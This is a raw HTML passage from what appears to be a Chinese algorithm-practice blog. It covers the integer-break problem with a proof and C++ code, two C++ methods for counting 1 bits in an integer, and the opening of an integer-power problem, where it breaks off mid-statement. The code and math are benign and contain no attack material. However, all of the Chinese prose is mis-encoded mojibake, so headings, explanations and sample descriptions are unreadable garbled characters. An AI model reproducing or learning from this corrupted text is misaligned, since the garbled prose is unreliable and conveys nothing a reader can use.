class="mord">2</span><span class="mord cjk_fallback">ã€</span><span class="mord">3</span><span class="mord cjk_fallback">ã€</span><span class="mord">3</span></span></span></span> çš„ä¸‰æ®µï¼Œæ­¤æ—¶å¾—åˆ°æœ€å¤§çš„ä¹˜ç§¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>18</mn></mrow><annotation encoding="application/x-tex">18</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">18</span></span></span></span>ã€‚</p><p><strong>æ ·ä¾‹</strong></p><pre><code>è¾“å…¥ï¼š8è¾“å‡ºï¼š18</code></pre><h3 id="æ•°å­¦åˆ†æ-O-n">æ•°å­¦åˆ†æ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><blockquote><p>ä»¥ä¸‹åˆ†ææ¥è‡ªäº<a href="https://www.acwing.com/solution/content/731/">yæ€»</a><br>æœ¬äººå»ºè®®æŒ‰æ•°å­—å¤§å°ä»2åˆ°5ã€6åˆ†æå°±èƒ½å‘ç°è§„å¾‹äº†ï¼ˆåšè¿‡æ­¤é¢˜çš„å‰æä¸‹ï¼‰</p></blockquote><p>è¿™é“é¢˜ç›®æ˜¯æ•°å­¦ä¸­ä¸€ä¸ªå¾ˆç»å…¸çš„é—®é¢˜ã€‚<br>ä¸‹é¢æˆ‘ä»¬ç»™å‡ºè¯æ˜ï¼š</p><p>é¦–å…ˆæŠŠä¸€ä¸ªæ­£æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi></mrow><annotation encoding="application/x-tex">N</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span></span></span></span> æ‹†åˆ†æˆè‹¥å¹²æ­£æ•´æ•°åªæœ‰æœ‰é™ç§æ‹†æ³•ï¼Œæ‰€ä»¥å­˜åœ¨æœ€å¤§ä¹˜ç§¯ã€‚<br>å‡è®¾ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>N</mi><mo>=</mo><msub><mi>n</mi><mn>1</mn></msub><mo>+</mo><msub><mi>n</mi><mn>2</mn></msub><mo>+</mo><mo>â‹¯</mo><mo>+</mo><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">N=n_1+n_2+\cdots +n_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"></span><span class="mord mathnormal" style="margin-right:0.10903em;">N</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">â‹¯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼Œå¹¶ä¸” <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mn>1</mn></msub><mo>Ã—</mo><msub><mi>n</mi><mn>2</mn></msub><mo>Ã—</mo><mo>â‹¯</mo><mo>Ã—</mo><msub><mi>n</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">n_1Ã—n_2Ã—\cdots Ã—n_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3011em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="minner">â‹¯</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ˜¯æœ€å¤§ä¹˜ç§¯ã€‚</p><ol><li>æ˜¾ç„¶1ä¸ä¼šå‡ºç°åœ¨å…¶ä¸­ï¼›</li><li>å¦‚æœå¯¹äºæŸä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>i</mi></mrow><annotation encoding="application/x-tex">i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6595em;"></span><span class="mord mathnormal">i</span></span></span></span> æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>i</mi></msub><mo>â‰¥</mo><mn>5</mn></mrow><annotation encoding="application/x-tex">n_i\ge 5</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.786em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¥</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">5</span></span></span></span>é‚£ä¹ˆæŠŠ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">n_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span> æ‹†åˆ†æˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>+</mo><mo stretchy="false">(</mo><msub><mi>n</mi><mi>i</mi></msub><mo>âˆ’</mo><mn>3</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">3+(n_iâˆ’3)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mclose">)</span></span></span></span>ï¼Œæˆ‘ä»¬æœ‰ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo stretchy="false">(</mo><msub><mi>n</mi><mi>i</mi></msub><mo>âˆ’</mo><mn>3</mn><mo stretchy="false">)</mo><mo>=</mo><mn>3</mn><msub><mi>n</mi><mi>i</mi></msub><mo>âˆ’</mo><mn>9</mn><mo>&gt;</mo><msub><mi>n</mi><mi>i</mi></msub></mrow><annotation encoding="application/x-tex">3(n_iâˆ’3)=3n_iâˆ’9&gt;n_i</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">3</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7944em;vertical-align:-0.15em;"></span><span class="mord">3</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">9</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ï¼›</li><li>å¦‚æœ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>n</mi><mi>i</mi></msub><mo>=</mo><mn>4</mn></mrow><annotation encoding="application/x-tex">n_i=4</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.5806em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3117em;"><span style="top:-2.55em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">4</span></span></span></span>ï¼Œæ‹†æˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>2</mn><mo>+</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">2+2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>ä¹˜ç§¯ä¸å˜ï¼Œæ‰€ä»¥ä¸å¦¨å‡è®¾æ²¡æœ‰4ï¼›</li><li>å¦‚æœæœ‰ä¸‰ä¸ªä»¥ä¸Šçš„2ï¼Œé‚£ä¹ˆ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>3</mn><mo>Ã—</mo><mn>3</mn><mo>&gt;</mo><mn>2</mn><mo>Ã—</mo><mn>2</mn><mo>Ã—</mo><mn>2</mn></mrow><annotation encoding="application/x-tex">3Ã—3&gt;2Ã—2Ã—2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6835em;vertical-align:-0.0391em;"></span><span class="mord">3</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.7278em;vertical-align:-0.0833em;"></span><span class="mord">2</span><span class="mspace" style="margin-right:0.2222em;"></span><span class="mbin">Ã—</span><span class="mspace" style="margin-right:0.2222em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">2</span></span></span></span>ï¼Œæ‰€ä»¥æ›¿æ¢æˆ3ä¹˜ç§¯æ›´å¤§ï¼›</li></ol><p>ç»¼ä¸Šï¼Œé€‰ç”¨å°½é‡å¤šçš„3ï¼Œç›´åˆ°å‰©ä¸‹2æˆ–è€…4æ—¶ï¼Œç”¨2ã€‚</p><p>æ—¶é—´å¤æ‚åº¦åˆ†æï¼šå½“ n æ¯”è¾ƒå¤§æ—¶ï¼Œn ä¼šè¢«æ‹†åˆ†æˆ âŒˆn/3âŒ‰ ä¸ªæ•°ï¼Œæˆ‘ä»¬éœ€è¦è®¡ç®—è¿™ä¹ˆå¤šæ¬¡å‡æ³•å’Œä¹˜æ³•ï¼Œæ‰€ä»¥æ—¶é—´å¤æ‚åº¦æ˜¯ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(n)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span>ã€‚</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">integerBreak</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">3</span>) <span class="keyword">return</span> <span class="number">1</span> * (n - <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> res = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">1</span>) res = <span class="number">4</span>, n -= <span class="number">4</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (n % <span class="number">3</span> == <span class="number">2</span>) res = <span class="number">2</span>, n -= <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (n) res *= <span class="number">3</span>, n -= <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•°"><a href="https://www.acwing.com/problem/content/25/">äºŒè¿›åˆ¶ä¸­1çš„ä¸ªæ•°</a></h2><p>è¾“å…¥ä¸€ä¸ª <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>32</mn></mrow><annotation encoding="application/x-tex">32</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">32</span></span></span></span> ä½æ•´æ•°ï¼Œè¾“å‡ºè¯¥æ•°äºŒè¿›åˆ¶è¡¨ç¤ºä¸­ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn></mrow><annotation encoding="application/x-tex">1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">1</span></span></span></span> çš„ä¸ªæ•°ã€‚</p><p><strong>æ³¨æ„</strong>ï¼š</p><ul><li>è´Ÿæ•°åœ¨è®¡ç®—æœºä¸­ç”¨å…¶ç»å¯¹å€¼çš„è¡¥ç æ¥è¡¨ç¤ºã€‚</li></ul><p><strong>æ•°æ®èŒƒå›´</strong></p><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>âˆ’</mo><mn>100</mn><mo>â‰¤</mo></mrow><annotation encoding="application/x-tex">-100 \le</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7804em;vertical-align:-0.136em;"></span><span class="mord">âˆ’</span><span class="mord">100</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">â‰¤</span></span></span></span> è¾“å…¥æ•´æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>â‰¤</mo><mn>100</mn></mrow><annotation encoding="application/x-tex">\le 100</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.7719em;vertical-align:-0.136em;"></span><span class="mrel">â‰¤</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">100</span></span></span></span></p><p><strong>æ ·ä¾‹1</strong></p><pre><code>è¾“å…¥ï¼š9è¾“å‡ºï¼š2è§£é‡Šï¼š9çš„äºŒè¿›åˆ¶è¡¨ç¤ºæ˜¯1001ï¼Œä¸€å…±æœ‰2ä¸ª1ã€‚</code></pre><p><strong>æ ·ä¾‹2</strong></p><pre><code>è¾“å…¥ï¼š-2è¾“å‡ºï¼š31è§£é‡Šï¼š-2åœ¨è®¡ç®—æœºé‡Œä¼šè¢«è¡¨ç¤ºæˆ11111111111111111111111111111110ï¼Œ      ä¸€å…±æœ‰31ä¸ª1ã€‚</code></pre><h3 id="æ³•1-è½¬åŒ–ä¸ºunsignedé¿å…ç§»ä½è¡¥ç¬¦å·æ•°-O-logn">æ³•1 è½¬åŒ–ä¸ºunsignedé¿å…ç§»ä½è¡¥ç¬¦å·æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p>éœ€è¦è½¬åŒ–ä¸ºunsigned, å¦åˆ™&gt;&gt;æ—¶ä¼šåœ¨å·¦è¾¹å¡«å……ç¬¦å·ä½1</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">NumberOf1</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> un = n;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (un) &#123;</span><br><span class="line">      res += un &amp; <span class="number">1</span>;</span><br><span class="line">      un &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="æ³•2-ä½¿ç”¨lowbit-å‡½æ•°-O-logn">æ³•2 ä½¿ç”¨lowbit()å‡½æ•° <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>O</mi><mo stretchy="false">(</mo><mi>l</mi><mi>o</mi><mi>g</mi><mi>n</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">O(logn)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">O</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">o</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">n</span><span class="mclose">)</span></span></span></span></h3><p>ä¸ç”¨è½¬åŒ–ä¸ºunsigned, å³x &amp; -xæ±‚lowbit(x)å¯¹int xå‡æˆç«‹</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">NumberOf1</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (n) &#123;</span><br><span class="line">      n = n - (n &amp; -n);</span><br><span class="line">      res++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹â˜…"><a href="https://www.acwing.com/problem/content/26/">æ•°å€¼çš„æ•´æ•°æ¬¡æ–¹â˜…</a></h2><p>å®ç°å‡½æ•°_double Power(double base, int exponent)_ï¼Œæ±‚_base_çš„ _exponent_æ¬¡æ–¹ã€‚</p><p>ä¸å¾—ä½¿ç”¨åº“å‡½æ•°ï¼ŒåŒæ—¶ä¸éœ€è¦è€ƒè™‘å¤§æ•°é—®é¢˜ã€‚</p><p>åªè¦è¾“å‡ºç»“æœä¸ç­”æ¡ˆçš„ç»å¯¹è¯¯å·®ä¸è¶…è¿‡ <span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mn>1</mn><msup><mn>0</mn><mrow><mo>âˆ’</mo><mn>2</mn></mrow></msup></mrow><annotation encoding="application/x-tex">10^{-2}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8141em;"></span><span class="mord">1</span><span class="mord"><span class="mord">0</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8141em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span> 